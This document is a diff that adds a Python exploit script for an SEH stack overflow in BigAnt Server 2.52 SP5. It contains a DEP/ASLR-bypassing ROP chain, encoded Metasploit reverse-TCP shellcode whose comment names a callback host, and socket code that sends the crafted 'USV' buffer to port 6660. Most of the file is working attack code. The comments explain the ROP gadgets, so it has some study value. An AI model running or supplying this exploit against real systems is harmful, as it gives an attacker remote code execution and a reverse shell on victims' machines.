@@ -1,0 +1,187 @@
+# Exploit Title: BigAnt Server 2.52 SP5 SEH Stack Overflow ROP-based exploit (ASLR + DEP bypass)
+# Date: 03/11/2012
+# Exploit Author: Lorenzo Cantoni
+# Vendor Homepage: http://www.bigantsoft.com/
+# Version: BigAnt Console 2.52 SP5
+# Tested on: Windows 7 SP0 x86 Italian - expsrv.dll (6.0.9589)
+# Info: Vulnerability discovered by Lincoln: http://www.securityfocus.com/bid/37520/info
+
+
+import socket
+import sys
+
+################
+#Attack plan
+#1) Overwrite SEH handler with a ROP Gadget that will move the stack pointer inside our buffer and continue the execution from there (ADD ESP,something + RETN should be ok)
+#2) Execute the ROP Chain for a VirtualAlloc() and PUSHAD
+#3) Run the shellcode
+#4) Have fun :)
+################
+
+
+# Memory Layout
+
+################
+#
+# Padding 
+#
+################
+#
+# ROP-NOP Sled
+#
+################
+#
+# ROP Chain
+#
+################
+#
+# Padding
+#
+################
+#
+# NOP SLED
+#
+################
+#
+# Shellcode
+#
+################
+#
+# Padding
+#
+################
+#
+# SEH Overwite (Stack Pivot)
+#
+################
+#
+# Padding (may be useful for other shellcode?)
+#
+################
+
+
+
+#From the original exploit, SEH will be overwritten after 966 bytes
+
+target_address=sys.argv[1]
+target_port=6660
+
+#./msfpayload windows/shell/reverse_tcp EXITFUNC=thread LHOST=192.168.1.5 LPORT=4444 R | ./msfencode -a x86 -b "\x00\x0a\x0d\x20\x25" -t c
+# size 317
+shellcode = ("\xb8\xc0\xd7\xb6\x97\xdb\xd2\xd9\x74\x24\xf4\x5d\x29\xc9\xb1"
+"\x49\x31\x45\x14\x03\x45\x14\x83\xc5\x04\x22\x22\x4a\x7f\x2b"
+"\xcd\xb3\x80\x4b\x47\x56\xb1\x59\x33\x12\xe0\x6d\x37\x76\x09"
+"\x06\x15\x63\x9a\x6a\xb2\x84\x2b\xc0\xe4\xab\xac\xe5\x28\x67"
+"\x6e\x64\xd5\x7a\xa3\x46\xe4\xb4\xb6\x87\x21\xa8\x39\xd5\xfa"
+"\xa6\xe8\xc9\x8f\xfb\x30\xe8\x5f\x70\x08\x92\xda\x47\xfd\x28"
+"\xe4\x97\xae\x27\xae\x0f\xc4\x6f\x0f\x31\x09\x6c\x73\x78\x26"
+"\x46\x07\x7b\xee\x97\xe8\x4d\xce\x7b\xd7\x61\xc3\x82\x1f\x45"
+"\x3c\xf1\x6b\xb5\xc1\x01\xa8\xc7\x1d\x84\x2d\x6f\xd5\x3e\x96"
+"\x91\x3a\xd8\x5d\x9d\xf7\xaf\x3a\x82\x06\x7c\x31\xbe\x83\x83"
+"\x96\x36\xd7\xa7\x32\x12\x83\xc6\x63\xfe\x62\xf7\x74\xa6\xdb"
+"\x5d\xfe\x45\x0f\xe7\x5d\x02\xfc\xd5\x5d\xd2\x6a\x6e\x2d\xe0"
+"\x35\xc4\xb9\x48\xbd\xc2\x3e\xae\x94\xb2\xd1\x51\x17\xc2\xf8"
+"\x95\x43\x92\x92\x3c\xec\x79\x63\xc0\x39\x2d\x33\x6e\x92\x8d"
+"\xe3\xce\x42\x65\xee\xc0\xbd\x95\x11\x0b\xd6\x3f\xeb\xdc\x19"
+"\x17\xf2\x19\xf2\x65\xf5\x30\x5e\xe0\x13\x58\x4e\xa4\x8c\xf5"
+"\xf7\xed\x47\x67\xf7\x38\x22\xa7\x73\xce\xd2\x66\x74\xbb\xc0"
+"\x1f\x74\xf6\xbb\xb6\x8b\x2d\xd1\x36\x1e\xc9\x70\x60\xb6\xd3"
+"\xa5\x46\x19\x2c\x80\xdc\x90\xb8\x6b\x8b\xdc\x2c\x6c\x4b\x8b"
+"\x26\x6c\x23\x6b\x12\x3f\x56\x74\x8f\x53\xcb\xe1\x2f\x02\xbf"
+"\xa2\x47\xa8\xe6\x85\xc8\x53\xcd\x17\x35\x82\x28\x92\x4f\xa0"
+"\x58\x5e")
+
+
+#  ROP Chain target
+#
+#            EAX = NOP (0x90909090)
+#            ECX = flProtect (0x40)
+#            EDX = flAllocationType (0x1000)
+#            EBX = dwSize (0x1)
+#            ESP = lpAddress (automatic)
+#            EBP = ReturnTo (ptr to jmp esp)
+#            ESI = ptr to VirtualAlloc()
+#            EDI = ROP NOP (RETN)
+
+# we will ROP inside VBAJET32.DLL which is proprietary and an OS DLL, C:\Windows\system32\expsrv.dll
+
+
+# ADJUST EDX AND EDI
+ropchain = ''
+for i in range(0,16): ropchain = ropchain + '\xc5\x86\x9e\x0f' #ADD EAX 100 - RETN  # REPEAT 16 TIMES
+ropchain = ropchain + '\x3c\xe4\x9e\x0f' # The next gadget point to the following
+#0F9EE43C   8BD0             MOV EDX,EAX
+#0F9EE43E   8D41 08          LEA EAX,DWORD PTR DS:[ECX+8]
+#0F9EE441   C1E0 04          SHL EAX,4
+#0F9EE444   2BC2             SUB EAX,EDX
+#0F9EE446   5F               POP EDI
+#0F9EE447   5E               POP ESI
+#0F9EE448   5D               POP EBP
+#0F9EE449   5B               POP EBX
+#0F9EE44A   C3               RETN
+
+# According to my  registers values, at pivoting time ECX+8 should point to a valid memory location so we go on
+
+ropchain = ropchain + '\x9f\x18\x9a\x0f' # RETN POPPED IN EDI (ROP-NOP)
+ropchain = ropchain + '\x41\x41\x41\x41' # compensation for POP ESI 
+ropchain = ropchain + '\x41\x41\x41\x41' # compensation for POP EBP
+ropchain = ropchain + '\xff\xff\xff\xff' # will be popped in EBX (and incremented later)
+
+# ADJUST ESI. We load the pointer for VirtualAlloc() and then resolve the address
+ropchain = ropchain + '\x3c\x7c\x9c\x0f' # POP EAX RETN
+ropchain = ropchain + '\xb4\x10\x9a\x0f' # POINTER TO *VirtualAlloc() # !mona ropfunc -m VBAJET32.DLL -cpb '\x00\x0a\x0d\x20\x25'
+ropchain = ropchain + '\x09\x2b\x9a\x0f' # we execute a POP ESI + RETN and we load a ROP NOP inside, as we have a CALL ESI later.
+ropchain = ropchain + '\x9f\x18\x9a\x0f' # ROP NOP
+ropchain = ropchain + '\x9c\x47\x9a\x0f' # resolves the pointer: MOV EAX, DWORD PTR DS:[EAX] -  RETN
+ropchain = ropchain + '\x06\x2b\x9a\x0f' # PUSH EAX - CALL ESI - POP ESI - RETN # save the address of VirtualAlloc, call a ROP NOP we have loaded previously, pop the address of VirtualAlloc in ESI, return.
+
+
+# ADJUST EBX
+for i in range(0,2): ropchain = ropchain + '\x08\xa7\x9c\x0f' # INC EBX - RETN # Repeat 2 times, we'll have ebx=1
+
+# ADJUST ECX
+ropchain = ropchain + '\x0c\x1f\x9a\x0f' # pop ecx retn
+ropchain = ropchain + '\xff\xff\xff\xff' # popped value
+
+for i in range(0,65): ropchain = ropchain + '\xad\x34\x9c\x0f'  #INC ECX - ADD AL,24 - RETN # repeat for 66 times, we'll have ecx=0x40. Dirty way, but we have a lot of space for our ropchain+shellcode
+
+# ADJUST EBP
+#Need a gadget which redirect the execution to the stack. 
+ropchain = ropchain + '\xaf\x8b\x9c\x0f' # POP EBP retn
+ropchain = ropchain + '\x62\x21\x9e\x0f' # Gadget to the following instructions: PUSH ESP - AND AL,1C - RETN
+
+# ADJUST EAX
+ropchain = ropchain +'\x3c\x7c\x9c\x0f' # POP EAX - RETN
+ropchain = ropchain +'\x90\x90\x90\x90' # value popped in eax
+
+# PUSHAD Gadget 
+ropchain = ropchain + '\xc2\x30\x9f\x0f' # PUSHAD - RETN
+
+######### END OF ROP CHAIN
+
+nopsled = "\x90" * 12 # A little bit of nop sled before our shellcode
+
+ropchain = ropchain + nopsled
+######### WE HAVE ROP CHAIN + NOPSLED 
+
+payload = '\x41' * 198 #ropchain starts after 210 bytes of padding, due add esp,514
+ropnopsled = ''
+for i in range (0,5): ropnopsled = ropnopsled + '\x9f\x18\x9a\x0f' # we place some ROP NOP around the 210th byte
+payload = payload + ropnopsled
+######## END OF PADDING + ROP NOP SLED
+
+payload = payload + ropchain
+payload = payload + shellcode
+payload = payload + '\x41' * (966 - 198 - len(ropnopsled + ropchain+shellcode))
+payload = payload + '\x4d\x26\x9a\x0f' #stack pivoting (overwrite SEH) OF9A264d vbajet32.dll #     ADD ESP,514 - RETN
+####### STACK PIVOTED AND SHELLCODE PLACED
+
+padding = '\x90' * (2504 - len(payload)) #Will fill the area after the SEH ovewrite. It might be possible to craft a second staged payload which executes after a jmp short placed in the first overwritten area
+
+buffer = "USV " + payload + padding + "\r\n\r\n"
+
+sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connect=sock.connect((target_address,target_port))
+sock.send(buffer)
+sock.close()
+
